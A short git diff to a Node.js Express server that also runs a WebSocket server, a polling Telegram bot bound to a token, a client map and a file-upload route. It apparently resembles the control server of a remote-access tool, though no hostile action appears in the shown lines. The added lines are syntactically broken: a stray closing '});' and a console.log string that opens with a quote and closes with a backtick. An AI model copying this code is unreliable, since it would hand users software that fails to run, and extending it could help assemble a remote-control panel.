@@ -13,8 +13,7 @@ const address = 'https://www.google.com'
 
 const app = express();
 const appServer = http.createServer(app);
-const appSocket = new webSocket.Server({server: appServer});
-const appSocket = new webSocket.Server('wss://knackadmin.onrender.com');
+const appSocket = new webSocket.Server({server: appServer})
 const appBot = new telegramBot(token, {polling: true});
 const appClients = new Map()
 
@@ -28,6 +27,16 @@ let currentTitle = ''
 app.get('/', function (req, res) {
     res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
 })
+
+});
+
+// Aquí puedes definir otras rutas o lógica de tu aplicación Express
+
+// Inicia el servidor en el puerto 3000 (o el puerto que prefieras)
+const PORT = process.env.PORT || 3000;
+appServer.listen(PORT, () => {
+    console.log('http://knackadmin.onrender.com:${PORT}`);
+});
 
 app.post("/uploadFile", upload.single('file'), (req, res) => {
     const name = req.file.originalname
